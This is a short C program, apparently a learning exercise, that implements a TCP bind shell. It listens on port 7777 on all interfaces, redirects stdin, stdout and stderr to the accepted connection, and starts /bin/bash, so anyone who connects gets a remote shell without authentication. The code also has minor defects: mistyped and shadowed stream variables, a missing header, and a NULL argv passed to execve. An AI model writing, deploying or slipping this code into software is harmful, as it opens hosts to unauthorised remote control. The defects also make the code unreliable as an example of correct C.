#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

int main(){
    int sockfd;
    int bind_handler, listen_handler, accept_handler;
    int stdin, stdout, sterr;
    struct protoent* protocol_number;

    //find protocol number for TCP to use in creating a TCP socket
    protocol_number = getprotobyname("tcp");
    printf("protocol number for tcp is %d\n", protocol_number->p_proto);

    //create socket
    sockfd = socket(PF_INET, SOCK_STREAM, protocol_number->p_proto);
    printf("socket created, return value %d\n", sockfd);

    //assigning a name to a socket - returns 0 on success
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET; //internetwork: UDP, TCP, etc
    server_addr.sin_addr.s_addr = INADDR_ANY; //listen on all interfaces
    server_addr.sin_port = htons(7777); //listen on this port

    bind_handler = bind(sockfd, (struct sockaddr*) &server_addr, sizeof(server_addr));
    printf("bind created, return value %d\n", bind_handler);

    //listen for socket connections
    listen_handler = listen(sockfd, 0);
    printf("listen for socket connections, return value %d\n", listen_handler);

    //accept socket connection
    accept_handler = accept(sockfd, NULL, NULL);
    printf("accept handler, return value %d\n", listen_handler);

    //duplicate file descriptor to stdin, stdout and stderr
    stdin = dup2(accept_handler, 0);
    stdout = dup2(accept_handler, 1);
    stderr = dup2(accept_handler, 2);

    //drop into a shell
    execve("/bin/bash", NULL, NULL);

    return 1;
}
